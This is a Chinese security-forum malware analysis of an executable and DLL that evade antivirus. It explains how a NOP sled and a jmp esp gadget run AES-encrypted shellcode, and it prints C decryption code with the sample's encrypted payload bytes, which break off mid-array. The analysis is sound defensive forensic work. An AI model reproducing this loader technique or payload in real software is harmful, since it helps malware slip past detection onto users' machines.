---
title: 一个可以免杀国内主流杀软的恶意样本分析
url: https://forum.butian.net/share/4004
source: 奇安信攻防社区
date: 2025-01-09
fetch_date: 2025-10-06T20:08:15.802832
---

# 一个可以免杀国内主流杀软的恶意样本分析

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 一个可以免杀国内主流杀软的恶意样本分析

* [渗透测试](https://forum.butian.net/topic/47)

本文细探讨了一种能够免杀国内所有杀软的恶意程序及其取证过程，全程取证过程在vmware虚拟机里进行并隔离断网

目录下存在愤怒的小鸟.exe和fun.dll文件，最新版火绒，windows defender，腾讯电脑管家，360静态扫描都未发现恶意程序
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-d69550e97839beb6e1bd03aea245e0f8b5d6a20b.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-8d3fb73df0bad9716162c60466b86aa04a230f6e.png)
动态执行，杀软也未拦截
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-62ccb0cef13916f201fd346f4a646b7b110ecc17.png)
上传到virustotal网站分析恶意程序，只有三个引擎检测出来
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-be6ef33471e5b1d2675773779c147004628d5fcf.png)
die分析恶意程序，未加壳，32位PE程序
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-ff6c4ec96f3852c9fbede1e24563ffd3c201fab7.png)
将恶意程序导入ida pro进行静态分析
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-3d8438a09d0aea38c2bd01620528a866991178b1.png)
程序主函数伪代码很少，没有常见恶意程序使用的函数，首先程序往v15变量里导入了2012个A字符
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-7f6b73391d3c61340a44f8192a5f933422caaab6.png)
然后定义了一个地址，通过查询，这个地址并未在当前程序中
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-511684bf7798969ea6ae044cdc82f9830d67d96b.png)
然后往v10变量里放入了很多0x90，0x90是汇编指令中的nop指令，NOP 指令（No Operation）是一种在计算机汇编语言中常见的指令，它的作用是不执行任何操作，即空操作
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-31c9b3450c14309a7fc086027d79b4947a914c60.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-247df46671d1f52edfad8b10a082489b899743da.png)
然后往pbData变量里传入了一串值，根据后面的分析，这一串值是解密shellcode的key
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-c342f392363ec46b6405b80cab0d1699a01de1c5.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-185658a5573aab795f9496832d2a66879ce28ce7.png)
v6，v8里的值就是payload
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-72ac3a3480748aa1000110d88b6244f382fb930d.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-f03746f8378d22e5531579fbc770da9b50bf6549.png)
这里程序调用了memcpy函数，拼接字符，并且是将payload拼接到了其中
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-e735948630bcf7adaf7042d2ade6c4d478eb62e8.png)
调用了\\_\\_i3b\\_D2函数，将密钥和payload都导入了其中，是解密payload的函数
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-8f1423dd047cdcfe56ab2d833726d874f4781aad.png)
aes的解密方式，说明payload是经过aes加密过的
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-f5b3df721628155841ca6ec74284d5e147d5e371.png)
然后将一大串nop指令和payload用memcpy函数copy到指定的变量里，最后调用了Function函数
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-551577d12ebd95521c4e31143048d643174d8539.png)
只有一个strcpy函数
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-ead5533894f7c06bc6ac960ec4d8f2c16c06d95a.png)
程序主要的代码就这么多，还不知如何绕过杀软执行上线的
使用pe-bear分析程序
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-35034f0383fa9f98498d9b9c836544e9245857ce.png)
导入了四个dll库，其中ADVAPI32.DLL，KENNEL32.DLL，msvcrt.dll都是程序编译时，系统自动绑定的dll，只有fun.dll是第三方dll，用ida分析fun.dll
找到exe程序中定义的地址，是一个jmp esp指令
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-65d088b323f93468c7ca682aab90485d8b05fb5a.png)
这个dll的代码只有jmp esp这一个功能
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-4237584cf1eaeca7570a8deb8bb6dcab21fbaedd.png)
从程序里导出shellcode后解密
```php
#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
void aes\_de(char\* code, DWORD codeLen, char\* key, DWORD keyLen) {
HCRYPTPROV hProv;
HCRYPTHASH hHash;
HCRYPTKEY hKey;
if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV\_RSA\_AES, CRYPT\_VERIFYCONTEXT)) {
return;
}
if (!CryptCreateHash(hProv, CALG\_SHA\_256, 0, 0, &hHash)) {
return;
}
if (!CryptHashData(hHash, (BYTE\*)key, keyLen, 0)) {
return;
}
if (!CryptDeriveKey(hProv, CALG\_AES\_256, hHash, 0, &hKey)) {
return;
}
if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE\*)code, &codeLen)) {
return;
}
CryptReleaseContext(hProv, 0);
CryptDestroyHash(hHash);
CryptDestroyKey(hKey);
}
int main(int argc, char \*argv[]) {
unsigned char payload[] = { 0xc1, 0x0, 0xfa, 0xed, 0x2, 0xda, 0xf5, 0xa6, 0xfb, 0xbc, 0xea, 0xe1, 0x48, 0xe0, 0xd2, 0x84, 0xaf, 0xe2, 0x42, 0xcd, 0x37, 0x43, 0xa5, 0xa9, 0x8c, 0x1e, 0xb7, 0xa5, 0x33, 0xc1, 0xde, 0x2c, 0x24, 0x84, 0xdf, 0x1c, 0xea, 0xcc, 0x34, 0xc4, 0x8, 0x56, 0xab, 0xa, 0xbf, 0xfc, 0x71, 0x25, 0x3, 0x41, 0x62, 0x28, 0x1a, 0xb5, 0x10, 0x39, 0xa2, 0xc4, 0xf5, 0x4e, 0x96, 0xb7, 0x66, 0x21, 0xb, 0x47, 0x74, 0x35, 0x2f, 0xd8, 0x25, 0xc6, 0xd0, 0x21, 0x77, 0x1b, 0xdc, 0xc6, 0xe8, 0xe8, 0x62, 0x5a, 0xe6, 0xe9, 0x31, 0xa, 0xff, 0xf2, 0x3f, 0xd1, 0x6, 0x9a, 0x62, 0x28, 0xf6, 0xec, 0xc8, 0x20, 0x4f, 0xe7, 0x6d, 0x82, 0x74, 0x84, 0xe2, 0xfa, 0xf, 0xff, 0x40, 0xcd, 0xea, 0x26, 0xa0, 0xe5, 0xcc, 0x7e, 0x67, 0x30, 0xa4, 0x21, 0xff, 0xcf, 0x79, 0xcb, 0xdc, 0xf0, 0x35, 0xa2, 0x6c, 0xc4, 0x54, 0xec, 0x4f, 0x94, 0xf, 0xdb, 0xb1, 0xb1, 0x60, 0x5e, 0x46, 0x87, 0xbf, 0x31, 0xc9, 0x30, 0xb6, 0xc6, 0xd4, 0x48, 0x0, 0x9a, 0x7f, 0x96, 0xdd, 0xa1, 0x15, 0xb9, 0xee, 0xd1, 0x91, 0x62, 0x5d, 0x98, 0xf6, 0x65, 0x37, 0xee, 0xce, 0x19, 0x16, 0x8f, 0x6d, 0xe2, 0x6f, 0x9f, 0xcb, 0x83, 0xd7, 0x2e, 0xdb, 0xcc, 0xae, 0x3e, 0xe, 0xad, 0x3c, 0xb0, 0xe3, 0x83, 0x9a, 0xac, 0xdd, 0x34, 0x2a, 0xa2, 0xe2, 0xee, 0xa1, 0x38, 0x81, 0xc, 0xb3, 0xfa, 0xfa, 0x71, 0x21, 0x7a, 0x2f, 0xb2, 0xa2, 0x57, 0xd, 0xaf, 0x37, 0xa4, 0x6d, 0x1f, 0x7f, 0x77, 0xb0, 0x7b, 0xdf, 0x68, 0xa, 0xe0, 0x35, 0xa7, 0xf0, 0x93, 0x0, 0xcf, 0x8e, 0x66, 0xc4, 0x32, 0xad, 0x9b, 0x4e, 0xdd, 0x4d, 0xb1, 0x11, 0xed, 0x56, 0x6b, 0x39, 0xe8, 0x57, 0xa7, 0x72, 0xf6, 0xb3, 0x95, 0xe0, 0x6a, 0xf2, 0x9f, 0x20, 0xfc, 0x41, 0xc5, 0xe7, 0x80, 0x7f, 0x1, 0x90, 0xaa, 0x13, 0xb2, 0xb4, 0xc, 0x74, 0xe5, 0x1f, 0x45, 0xdd, 0xc1, 0x34, 0x17, 0xb5, 0x1e, 0x84, 0x18, 0x4a, 0x9a, 0xbc, 0xc9, 0x8d, 0x54, 0xa1, 0x0, 0x57, 0xc, 0xc8, 0xec, 0x3a, 0xe8, 0x23, 0x65, 0x71, 0x7e, 0xeb, 0xc3, 0x46, 0x73, 0x6f, 0x50, 0xc7, 0x7d, 0x23, 0xe9, 0x25, 0x7a, 0xb2, 0x8f, 0x79, 0x7, 0xfd, 0xa4, 0x86, 0x90, 0xb5, 0xdc, 0xbb, 0x97, 0x2, 0xf7, 0xd4, 0x99, 0xfe, 0x1a, 0xc1, 0x9c, 0xd8, 0x8d, 0x88, 0xf, 0x34, 0xe6, 0xfc, 0xa0, 0xdb, 0x2d, 0x96, 0x14, 0xef, 0x11, 0xeb, 0x53, 0x17, 0x5d, 0x6b, 0x4c, 0xbd, 0xe8, 0xf5, 0x20, 0x31, 0x3e, 0x4e, 0x8c, 0xa1, 0xc8, 0xc7, 0x70, 0xbd, 0xdc, 0xa4, 0xc, 0x79, 0x29, 0x19, 0x1e, 0xb2, 0x7d, 0x6b, 0xbc, 0xb2, 0xed, 0xa2, 0xe9, 0x1f, 0x31, 0x3c, 0xd2, 0xb0, 0x43, 0xec, 0xe4, 0x46, 0x42, 0x3c, 0xe3, 0x25, 0xa9, 0xda, 0x34, 0xa2, 0xbb, 0xf7, 0x9d, 0x32, 0x57, 0xdf, 0xd7, 0xcf, 0xfc, 0x9, 0x10, 0x9, 0x6, 0x4b, 0xf6, 0x2, 0xf8, 0xed, 0x5c, 0x45, 0x15, 0x8b, 0x61, 0x61, 0x65, 0x9d, 0x58, 0x27, 0xe8, 0xe3, 0x22, 0xbb, 0x2e, 0x1e, 0x94, 0x7f, 0xa4, 0xe2, 0x36, 0x41, 0x2d, 0x24, 0xb, 0x40, 0x29, 0xf6, 0x24, 0x1e, 0xf8, 0xe8, 0xb0, 0xf5, 0x45, 0xb7, 0xd9, 0x69, 0x52, 0xae, 0xae, 0xa1, 0xb1, 0xec, 0x97, 0x78, 0x5b, 0x9b, 0x3c, 0x7e, 0xe6, 0xbf, 0xb, 0x86, 0x7, 0xee, 0xfb, 0xe9, 0xfb, 0xc, 0xdf, 0xa7, 0xda, 0xdb, 0x99, 0xa7, 0xc, 0x72, 0x4...